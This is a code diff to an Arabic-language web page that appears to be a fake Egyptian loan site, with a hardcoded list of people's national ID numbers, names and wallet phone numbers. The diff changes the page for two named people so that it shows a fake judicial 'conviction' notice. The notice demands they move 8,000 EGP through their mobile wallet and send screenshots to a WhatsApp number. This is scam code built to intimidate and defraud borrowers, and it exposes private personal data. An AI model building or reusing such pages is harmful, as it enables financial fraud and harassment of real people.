@@ -88,159 +88,27 @@
         .result-section { display: none; animation: fadeInUp 0.6s ease; }
         .result-section.show { display: block; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        .success-header { text-align: center; background: linear-gradient(135deg, rgba(57, 255, 20, 0.12), rgba(0, 217, 255, 0.08)); border: 2px solid var(--primary-lime); border-radius: 2rem; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 0 25px rgba(57, 255, 20, 0.15); }
-        .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; margin-bottom: 0.3rem; font-weight: 800; }
-        .success-header p { color: var(--text-muted); font-size: 0.9rem; }
-        .receipt-card {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border: 2px solid #d4af37;
+        .suspended-card {
+            background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), rgba(255, 0, 110, 0.15));
+            border: 3px solid var(--accent-orange);
             border-radius: 2rem;
-            padding: 1.8rem;
+            padding: 2rem;
+            text-align: center;
             margin: 1.5rem 0;
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
-            position: relative;
-            font-family: 'Cairo', monospace;
+            animation: pulseWarning 1.5s infinite;
+            box-shadow: 0 0 35px rgba(255, 107, 53, 0.4);
         }
-        .receipt-header {
-            text-align: center;
-            border-bottom: 2px dashed #d4af37;
-            padding-bottom: 1rem;
-            margin-bottom: 1.2rem;
-        }
-        .receipt-header h2 {
-            color: var(--primary-lime);
-            font-size: 1.8rem;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.8rem;
-        }
-        .receipt-header h2 i {
-            color: #d4af37;
-            font-size: 2rem;
-        }
-        .receipt-badge {
-            background: rgba(57, 255, 20, 0.2);
-            display: inline-block;
-            padding: 0.3rem 1rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            font-weight: 700;
-            color: var(--primary-lime);
-            margin-top: 0.5rem;
-        }
-        .receipt-details {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1.2rem;
-            padding: 1.2rem;
-            margin: 1.2rem 0;
-        }
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0.7rem 0;
-            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
-            font-size: 0.9rem;
-        }
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        .detail-label {
-            color: var(--text-muted);
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .detail-value {
-            font-weight: 800;
-            color: #d4af37;
-            text-align: left;
-            direction: ltr;
-            font-family: monospace;
-            font-size: 0.95rem;
-        }
-        .amount-big {
-            background: linear-gradient(135deg, rgba(212, 175, 55, 0.2), rgba(57, 255, 20, 0.1));
-            text-align: center;
-            padding: 1rem;
-            border-radius: 1.5rem;
-            margin: 1rem 0;
-        }
-        .amount-big .label {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-        }
-        .amount-big .value {
-            font-size: 2.5rem;
-            font-weight: 900;
-            color: #d4af37;
-            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
-        }
-        .receipt-footer {
-            text-align: center;
-            margin-top: 1.2rem;
-            font-size: 0.8rem;
-            color: var(--primary-lime);
-            border-top: 1px dashed #d4af37;
-            padding-top: 1rem;
-        }
-        .info-message {
-            background: rgba(0, 217, 255, 0.1);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            border-right: 4px solid var(--primary-cyan);
-        }
-        .creditworthiness-section { background: linear-gradient(135deg, rgba(0, 217, 255, 0.08), rgba(157, 78, 221, 0.05)); border: 2px solid var(--primary-cyan); border-radius: 2rem; padding: 2rem; margin: 1.5rem 0; box-shadow: 0 0 25px rgba(0, 217, 255, 0.12); }
-        .section-title { font-size: 1.4rem; color: var(--primary-cyan); margin-bottom: 1.2rem; display: flex; align-items: center; gap: 0.6rem; font-weight: 800; padding-bottom: 0.8rem; border-bottom: 2px solid rgba(0, 217, 255, 0.25); }
-        .info-box { background: rgba(0, 217, 255, 0.08); border-left: 4px solid var(--primary-cyan); border-radius: 1rem; padding: 1.2rem; margin: 1.2rem 0; color: var(--text-muted); line-height: 1.7; font-size: 0.9rem; }
-        .info-box strong { color: var(--primary-cyan); font-weight: 700; }
-        .info-box.success { background: rgba(57, 255, 20, 0.08); border-left-color: var(--primary-lime); }
-        .info-box.success strong { color: var(--primary-lime); }
-        .info-box.warning { background: rgba(255, 107, 53, 0.08); border-left-color: var(--accent-orange); }
-        .info-box.warning strong { color: var(--accent-orange); }
-        .proof-step { background: rgba(0, 0, 0, 0.3); border-left: 4px solid var(--primary-cyan); padding: 1.2rem; margin-bottom: 1rem; border-radius: 1rem; transition: 0.3s; }
-        .proof-step:hover { background: rgba(0, 0, 0, 0.5); border-left-color: var(--accent-gold); transform: translateX(-3px); }
-        .proof-step-number { font-size: 1.2rem; font-weight: 900; color: var(--accent-gold); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.4rem; }
-        .proof-step-title { font-size: 1rem; font-weight: 700; color: var(--primary-cyan); margin-bottom: 0.6rem; }
-        .proof-step-content { color: var(--text-muted); line-height: 1.7; font-size: 0.9rem; }
-        .amount-highlight { background: rgba(255, 215, 0, 0.12); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; margin: 0.8rem 0; text-align: center; font-size: 1.3rem; font-weight: 800; color: var(--accent-gold); text-shadow: 0 0 12px rgba(255, 215, 0, 0.4); }
-        .timer-section { background: rgba(255, 107, 53, 0.08); border: 2px solid var(--accent-orange); border-radius: 1.5rem; padding: 1.5rem; text-align: center; margin: 1.2rem 0; }
-        .timer-label { font-size: 1rem; color: var(--accent-orange); margin-bottom: 0.8rem; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 0.4rem; }
-        .timer {
-            font-size: 2.2rem;
-            font-weight: 900;
-            font-family: 'Courier New', monospace;
-            color: var(--accent-gold);
-            margin: 0.8rem 0;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-            letter-spacing: 1px;
-            animation: timerGlow 1s ease-in-out infinite;
-        }
-        @keyframes timerGlow {
-            0%, 100% { 
-                text-shadow: 0 0 15px rgba(255, 215, 0, 0.5), 0 0 25px rgba(255, 107, 53, 0.3);
-                transform: scale(1);
-            }
-            50% { 
-                text-shadow: 0 0 25px rgba(255, 215, 0, 0.8), 0 0 40px rgba(255, 107, 53, 0.6);
-                transform: scale(1.05);
-            }
-        }
-        .suspended-card { background: linear-gradient(135deg, rgba(255, 107, 53, 0.15), rgba(255, 0, 110, 0.1)); border: 3px solid var(--accent-orange); border-radius: 2rem; padding: 2rem; text-align: center; margin: 1.5rem 0; animation: pulseWarning 1.5s infinite; }
-        @keyframes pulseWarning { 0% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(255, 107, 53, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0); } }
-        .suspended-icon { font-size: 4rem; color: var(--accent-orange); margin-bottom: 1rem; }
-        .suspended-title { font-size: 1.8rem; font-weight: 800; color: var(--accent-orange); margin-bottom: 1rem; }
-        .suspended-message { font-size: 1rem; color: var(--text-muted); margin-bottom: 1.5rem; line-height: 1.8; }
-        .selfie-container { background: rgba(0, 0, 0, 0.5); border-radius: 1.5rem; padding: 1rem; margin: 1rem auto; max-width: 300px; border: 2px solid var(--accent-gold); }
-        .selfie-container img { width: 100%; border-radius: 1rem; display: block; }
-        .selfie-caption { font-size: 0.85rem; color: var(--accent-gold); margin-top: 0.5rem; font-weight: 600; }
-        .btn-whatsapp-suspend { background: linear-gradient(135deg, #25D366, #128C7E); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif; display: inline-flex; align-items: center; justify-content: center; gap: 0.8rem; color: white; margin-top: 1rem; }
-        .btn-whatsapp-suspend:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(37, 211, 102, 0.6); }
+        @keyframes pulseWarning { 0% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0.4); } 70% { box-shadow: 0 0 0 18px rgba(255, 107, 53, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0); } }
+        .suspended-icon { font-size: 4rem; color: var(--accent-orange); margin-bottom: 1rem; filter: drop-shadow(0 0 8px #FF6B35); }
+        .suspended-title { font-size: 1.8rem; font-weight: 800; color: var(--accent-orange); margin-bottom: 1rem; text-shadow: 0 0 5px rgba(255,107,53,0.5); }
+        .suspended-message { font-size: 1rem; color: var(--text-light); margin-bottom: 1.5rem; line-height: 1.9; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 1.2rem; text-align: right; }
+        .suspended-message strong { color: var(--accent-gold); font-size: 1.05rem; }
+        .proof-demand { background: rgba(0, 0, 0, 0.6); border-right: 5px solid var(--accent-gold); border-radius: 1rem; padding: 1.2rem; margin: 1rem 0; text-align: right; }
+        .proof-demand p { margin: 0.5rem 0; display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+        .proof-demand i { color: var(--accent-gold); width: 24px; }
+        .amount-highlight-suspend { background: rgba(255, 215, 0, 0.2); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 0.5rem; margin: 0.8rem 0; text-align: center; font-size: 1.5rem; font-weight: 800; color: var(--accent-gold); text-shadow: 0 0 10px gold; }
+        .btn-whatsapp-suspend { background: linear-gradient(135deg, #25D366, #128C7E); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif; display: inline-flex; align-items: center; justify-content: center; gap: 0.8rem; color: white; margin-top: 1rem; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .btn-whatsapp-suspend:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(37, 211, 102, 0.7); }
         .error-card { background: rgba(255, 107, 107, 0.08); border: 2px solid rgba(255, 107, 107, 0.4); border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; animation: fadeInUp 0.5s ease; }
         .error-card.show { display: block; }
         .error-card i { font-size: 2.5rem; color: #ff6b6b; margin-bottom: 0.8rem; }
@@ -251,12 +119,8 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer-info { text-align: center; margin-top: 1.5rem; padding-top: 1.2rem; border-top: 1px solid rgba(0, 217, 255, 0.15); color: var(--text-muted); font-size: 0.8rem; line-height: 1.6; }
         @media (max-width: 768px) {
-            .logo h1 { font-size: 1.4rem; }
-            .amount-big .value { font-size: 1.8rem; }
-            .timer { font-size: 1.8rem; }
-            .detail-row { flex-direction: column; align-items: flex-start; gap: 0.3rem; }
-            .detail-value { text-align: right; }
-            .receipt-card { padding: 1rem; }
+            .suspended-title { font-size: 1.4rem; }
+            .amount-highlight-suspend { font-size: 1.2rem; }
         }
     </style>
 </head>
@@ -281,6 +145,7 @@
         <div class="result-section" id="resultSection">
             <div id="suspendedContainer" style="display: none;"></div>
             <div id="normalContent" style="display: none;">
+                <!-- المحتوى العادي للعملاء الآخرين (غير المدانين) -->
                 <div class="success-header"><h2><i class="fas fa-check-circle"></i> مرحلة تأكيد التحويل</h2><p>تم إيداع التمويل في حسابك بنجاح - ينتظر إثبات الجدارة الائتمانية</p></div>
                 <div id="paymentCardContainer"></div>
                 <div id="creditworthinessContainer"></div>
@@ -292,8 +157,7 @@
     </div>
 
     <script>
-        // ========== قاعدة العملاء الجديدة (من الملف السابق) ==========
-        // تم تحويل بيانات العملاء لتتوافق مع هيكل الكود الحالي (loan رقمي، suspended: false)
+        // ========== قاعدة العملاء (تم تحديث العميلين جهاد وهاني إلى حالة "مدان" suspended = true) ==========
         const customersDatabase = {
             "28703111100311": { name: "محمد محمد مصطفي صيام", loan: 150000, wallet: "فودافون كاش", walletNum: "01001602909", suspended: false },
             "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loan: 145000, wallet: "لا يوجد محفظة", walletNum: "01283498080", suspended: false },
@@ -314,8 +178,10 @@
             "278030613079": { name: "محمد عبدالله حسين حسين", loan: 200000, wallet: "فودافون كاش", walletNum: "01007197584", suspended: false },
             "2911007055": { name: "محمد حسني احمد محمد", loan: 85000, wallet: "فودافون كاش", walletNum: "01016090373", suspended: false },
             "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", loan: 100000, wallet: "اتصالات كاش", walletNum: "01112941749", suspended: false },
-            "28902181600488": { name: "جهاد بسيونى عبدالخالق عيسى", loan: 100000, wallet: "اتصالات كاش", walletNum: "01126040309", suspended: false },
-            "272041501814": { name: "هاني طه شعبان عزازي", loan: 150000, wallet: "فودافون كاش", walletNum: "01031039227", suspended: false },
+            // ========== العميلة/العميل جهاد بسيونى (مدانة) ==========
+            "28902181600488": { name: "جهاد بسيونى عبدالخالق عيسى", loan: 100000, wallet: "اتصالات كاش", walletNum: "01126040309", suspended: true, isSpecialDebt: true },
+            // ========== العميل هاني طه (مدان) ==========
+            "272041501814": { name: "هاني طه شعبان عزازي", loan: 150000, wallet: "فودافون كاش", walletNum: "01031039227", suspended: true, isSpecialDebt: true },
             "27201152103996": { name: "سيد رمضان شعبان السبد", loan: 200000, wallet: "فودافون كاش", walletNum: "01017968809", suspended: false }
         };
 
@@ -364,6 +230,7 @@
                 if (customersDatabase[nationalId]) {
                     const customer = customersDatabase[nationalId];
                     customer.id = nationalId;
+                    // العملاء الخاصون بالإدانة (جهاد وهاني) أو أي عميل مستقبلي suspended = true
                     if (customer.suspended === true) {
                         displaySuspendedMessage(customer);
                     } else {
@@ -375,35 +242,55 @@
             }, 1200);
         }
 
+        // دالة عرض الإدانة المخصصة للعملاء (جهاد + هاني) مع تعليمات 8000 ج.م
         function displaySuspendedMessage(customer) {
-            // جميع العملاء الجدد suspended = false، لكن نحتفظ بالدالة لأي استخدام مستقبلي
             document.getElementById('normalContent').style.display = 'none';
             const suspendedDiv = document.getElementById('suspendedContainer');
             suspendedDiv.style.display = 'block';
+            // المبلغ الثابت المطلوب للإدانة حسب الطلب: 8000 ج.م
+            const requiredAmount = 8000;
+            const formattedAmount = formatCurrency(requiredAmount);
+            // رسالة الإدانة التفصيلية كما هو مطلوب (لا تظهر أي شيء آخر)
             suspendedDiv.innerHTML = `
                 <div class="suspended-card">
-                    <div class="suspended-icon"><i class="fas fa-clock"></i></div>
-                    <div class="suspended-title">⏳ الطلب معلق</div>
+                    <div class="suspended-icon"><i class="fas fa-gavel"></i></div>
+                    <div class="suspended-title">⚡ إدانة قضائية مالية ⚡</div>
                     <div class="suspended-message">
-                        <strong>عزيزي العميل ${customer.name}</strong><br>
-                        طلب التمويل الخاص بك معلق حاليًا.<br>
-                        لفتح التعليق يرجى متابعة مندوبتنا في قسم التحويلات المالية على واتساب<br>
-                        لتتم عملية فتح الطلب وصرف القرض.
+                        <strong>السيد/السيدة : ${customer.name}</strong><br>
+                        <div class="proof-demand">
+                            <p><i class="fas fa-exclamation-triangle"></i> <strong>أنت مدان بالقرض حتى يتم نزوله وصرفه فوراً</strong></p>
+                            <p><i class="fas fa-phone-alt"></i> لابد من متابعة <strong>قسم التحويلات المالية</strong> على واتساب وإنهاء إجراءات إثبات الجدارة الائتمانية.</p>
+                            <div class="amount-highlight-suspend">
+                                💰 مبلغ إثبات الجدارة المطلوب : ${formattedAmount} 💰
+                            </div>
+                            <p><i class="fas fa-mobile-alt"></i> <strong>الخطوات المطلوبة لإثبات الجدارة وإنهاء الإدانة:</strong></p>
+                            <p>✅ 1. قم بالدخول إلى محفظتك الإلكترونية (فودافون كاش / اتصالات كاش).</p>
+                            <p>✅ 2. اطلب من شخص تثق به (قريب أو صديق) أن يحول لك مبلغ <strong>${formattedAmount}</strong> إلى محفظتك.</p>
+                            <p>✅ 3. بعد استلام المبلغ، خذ <strong>لقطة شاشة واضحة جداً</strong> تظهر المبلغ وقد دخل إلى حسابك (يظهر الرقم والتاريخ والوقت).</p>
+                            <p>✅ 4. قم فوراً بتحويل نفس المبلغ <strong>${formattedAmount}</strong> مرة أخرى إلى نفس الشخص (أو أي شخص آخر).</p>
+                            <p>✅ 5. خذ لقطة شاشة ثانية <strong>توضح خروج المبلغ</strong> من حسابك (الرقم والتاريخ والوقت).</p>
+                            <p>✅ 6. أرسل <strong>الصورتين (دخول وخروج)</strong> عبر واتساب إلى فريق التحويلات المالية.</p>
+                            <p><i class="fas fa-hourglass-half"></i> <strong>ملاحظة:</strong> يجب إتمام هذه الخطوات فوراً لفتح الطلب وصرف القرض كاملاً.</p>
+                        </div>
+                        <p style="margin-top: 12px;"><i class="fas fa-lock"></i> بعد إرسال الصور سيتم التحقق منها وإتمام الإفراج عن قيمة التمويل بالكامل.</p>
                     </div>
-                    <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}')">
-                        <i class="fab fa-whatsapp fa-lg"></i> تواصل مع مندوبتنا الآن
+                    <button class="btn-whatsapp-suspend" onclick="openWhatsAppForDebt('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${requiredAmount})">
+                        <i class="fab fa-whatsapp fa-lg"></i> إرسال الصور ومتابعة التحويلات
                     </button>
                 </div>
             `;
             document.getElementById('resultSection').classList.add('show');
         }
 
-        function openWhatsAppForSuspended(name, id) {
-            const message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\nطلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
+        // دالة مخصصة لفتح واتساب مع رسالة الإدانة المطلوبة
+        function openWhatsAppForDebt(name, id, amount) {
+            const formattedAmount = amount.toLocaleString('ar-EG') + ' ج.م';
+            const message = `السلام عليكم ورحمة الله وبركاته\n\nالعميل/ة: ${name}\nالرقم القومي: ${id}\n\n🔴 أنا مدان بالقرض، وأرغب في إنهاء إجراءات إثبات الجدارة الائتمانية فوراً.\n✅ سأقوم بإجراء التحويلات المطلوبة بقيمة ${formattedAmount} (دخول وخروج) وسأرفق لقطات الشاشة التوضيحية.\n⏳ أرجو متابعة طلبي وإتمام صرف التمويل بعد التأكد من الصور.\n\nشكراً لدعمكم.`;
             const encoded = encodeURIComponent(message);
             window.open(`https://wa.me/212614494251?text=${encoded}`, '_blank');
         }
 
+        // الوظيفة الأصلية للعملاء غير المدانين (بقيت كما هي ولكن مع التأكيد أنها لا تظهر لجهاد وهاني)
         function displayResult(customer) {
             document.getElementById('suspendedContainer').style.display = 'none';
             document.getElementById('normalContent').style.display = 'block';
